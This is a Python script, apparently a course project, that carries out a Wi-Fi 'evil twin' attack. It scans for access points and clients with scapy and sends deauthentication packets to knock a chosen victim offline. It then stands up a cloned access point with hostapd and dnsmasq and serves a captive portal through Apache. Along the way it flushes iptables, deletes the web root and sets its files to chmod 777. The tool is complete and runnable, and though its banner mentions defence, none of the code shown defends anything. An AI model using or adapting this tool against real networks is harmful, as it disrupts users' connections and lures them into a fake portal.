import os
import signal
import signal
import sys
import time
from multiprocessing import Process
from string import Template

from scapy.all import *

from scapy.layers.dot11 import Dot11, Dot11Beacon, RadioTap, Dot11Deauth

# a dictionary to store all the aps
# MacAddress -> [ssid, channel]
ap_list = {}

# Current interface
monitor_interface = ''
fake_ap_interface = ''

# BSSID of the chosen access point and client
ap_bssid = ''
client_bssid = ''

# A dictionary that stores for each Access Point BSSID a list of clients
# { 'MAC address of ap' : ['client 1', ....]}
ap_clients = {}


# 'cls' is the command that clear the CMD in Windows, while 'clear' is used in Linux
# reference:
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


# sniffing beacons to get ap
# reference: Lecture
def sniff_ap(p):
    if p.haslayer(Dot11):
        if p.type == 0 and p.subtype == 8:
            if p.addr2 not in ap_list:
                stats = p[Dot11Beacon].network_stats()
                channel = stats.get("channel")
                ap_list[p.addr2] = [p.info.decode(), channel]
                if p.addr2 not in ap_clients:
                    ap_clients[p.addr2] = []


# This function change the monitor interface channel each 0.5 seconds for t seconds.
# reference: https://charlesreid1.com/wiki/Scapy/AP_Scanner
def channel_hopper(t):
    ch = 1
    end_time = time.time() + t
    while (end_time - time.time()) > 0:
        try:
            os.system(f'iwconfig {monitor_interface} channel {ch}')
            # Switching channels from 1 to 14 each 0.5 seconds
            ch = ch % 14 + 1
            print(f'{end_time - time.time()}', end='\r')
            time.sleep(0.5)
        except KeyboardInterrupt:
            break


# print the access points in the area
def print_aps():
    i = 0
    clear_console()
    print(f'Number of aps: {len(ap_list)}')
    for n in ap_list.keys():
        print(f'index: {i}  MacAddress: {n}  channel: {ap_list[n][1]} \t {ap_list[n][0]}')
        i += 1


# print the MAC address of the clients
def print_clients():
    i = 0
    clear_console()
    print(f'Number of clients: {len(ap_clients[ap_bssid])}')
    for client in ap_clients[ap_bssid]:
        print(f'{i}\t {client} ')
        i += 1


# Let the user choose an access point to scan for targets
def choose_ap():
    chosen_ap = input("Please choose an index of the ap you want: ")

    # creating a list full of address, then save the chosen bssid in chosen_ap
    list_aps_adr = list(ap_list.keys())

    global ap_bssid
    ap_bssid = list_aps_adr[int(chosen_ap)]

    clear_console()
    print(f'You chose the next access point {ap_bssid} - {ap_list[ap_bssid][0]}')


# Let the user choose the target he wants to attack
def choose_client():
    chosen_client = input("Please choose a client you want to attack: ")

    global client_bssid
    client_bssid = ap_clients[ap_bssid][int(chosen_client)]

    clear_console()
    print(f'You choose to attack the next client {client_bssid}')


# reference: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
def deauth_attack():
    os.system(f"iwconfig {monitor_interface} channel {ap_list[ap_bssid][1]}")

    dot11_client = Dot11(addr1=client_bssid, addr2=ap_bssid, addr3=client_bssid)
    dot11_ap = Dot11(addr1=ap_bssid, addr2=client_bssid, addr3=ap_bssid)

    packet_client = RadioTap() / dot11_client / Dot11Deauth()
    packet_ap = RadioTap() / dot11_ap / Dot11Deauth()

    sendp(packet_ap, iface=monitor_interface, inter=0.100, count=150)
    sendp(packet_client, iface=monitor_interface, inter=0.100, count=150)


# reference: https://aaronjohn2.github.io/2018/12/23/captive-portal/
# https://www.geeksforgeeks.org/template-class-in-python/
def create_fake_ap():
    with open('hostapd.conf', 'r+') as fp:
        t = Template(fp.read())
        # Go to the beginning of the file
        fp.seek(0)
        fp.write(t.substitute(INTERFACE=fake_ap_interface, APNAME=ap_list[ap_bssid][0]))
        # Fix a specific problem
        fp.truncate()

    with open('dnsmasq.conf', 'r+') as fp:
        t = Template(fp.read())
        fp.seek(0)
        fp.write(t.substitute(INTERFACE=fake_ap_interface))
        fp.truncate()

    os.system('systemctl stop systemd-resolved')
    os.system('systemctl disable systemd-resolved.service')
    os.system('service network-manager stop')

    os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
    os.system('sudo iptables --flush')
    os.system('sudo iptables --table nat --flush')
    os.system('sudo iptables --delete-chain')
    os.system('sudo iptables --table nat --delete-chain')
    os.system('sudo iptables -P FORWARD ACCEPT')

    os.system('sudo dnsmasq -C dnsmasq.conf')

    os.system('sudo hostapd hostapd.conf -B')

    os.system(f'sudo ifconfig {fake_ap_interface} 10.0.0.1 netmask 255.255.255.0')
    os.system('route add default gw 10.0.0.1')

    os.system('sudo service apache2 start')


# add the clients of our chosen access point
def user_handler(p):
    global ap_clients
    if p.addr2 not in ap_list and p.addr3 == ap_bssid and p.addr2 not in ap_clients[ap_bssid]:
        ap_clients[ap_bssid].append(p.addr2)


# Change the permissions of each file in the directory
def change_per():
    print('Changing permissions to all the files in /var/www/html/ directory')
    os.system('chmod 777 /var/www/html/*')
    print('Done.\n')


# copying our web files to the given destination
def copy_web_files():
    print('Copy our web files to /var/www/html/')
    os.system('cp -r Website/* /var/www/html')
    print('Done.\n')


# Create a captive portal
def c_portal():
    print('Remove all the content in /var/www/html/ directory')
    os.system('rm -r /var/www/html/* 2>/dev/null')
    print('Done.\n')

    copy_web_files()

    change_per()


if __name__ == '__main__':

    clear_console()
    print("\t----------------------------------------------------------------")
    print("\t\tWelcome to the Evil Twin attack and defence program!")
    print("\t----------------------------------------------------------------\n\n")

    os.system("iwconfig")
    print("\n")
    monitor_interface = input("Please write the name of the Interface you want to change to monitor mode: ")
    clear_console()
    print(f'Changing the mode of {monitor_interface} to monitor mode.')
    # sniff code taken from the lecture
    os.system('chmod +x sniff')
    os.system(f'./sniff {monitor_interface} 6')
    clear_console()
    print(f'The Interface {monitor_interface} changed its mode to monitor.\n\n\n')

    os.system("iwconfig")
    fake_ap_interface = input("Now please choose the Interface you wish to be the ap: ")
    clear_console()
    print(f'You choose the interface {fake_ap_interface} to be used for access point')

    # Print the program header
    print("Please wait while searching for access points.")

    # Start the channel hopper
    # Jump between channels
    p = Process(target=channel_hopper, args=(30,))
    p.start()

    # start sniffing for Access Points
    sniff(iface=monitor_interface, prn=sniff_ap, timeout=30)

    p.join()
    p.kill()

    print_aps()
    choose_ap()

    # after the user choose an access point we need to scan for clients
    print("Searching for clients please wait..")
    p = Process(target=channel_hopper, args=(60,))
    p.start()

    # start sniffing for clients!
    sniff(iface=monitor_interface, prn=user_handler, timeout=60)

    # Check if possible to delete
    p.join()
    p.kill()

    print_clients()
    choose_client()

    #     At this stage of the process the user choose the victim
    #     Therefore we start the attack.
    #     First we need to create a fake ap with the same ssid, then
    #     disconnect the victim from the ap, for this we will use a "Deauth attack"

    deauth_attack()

    create_fake_ap()
    clear_console()

    c_portal()
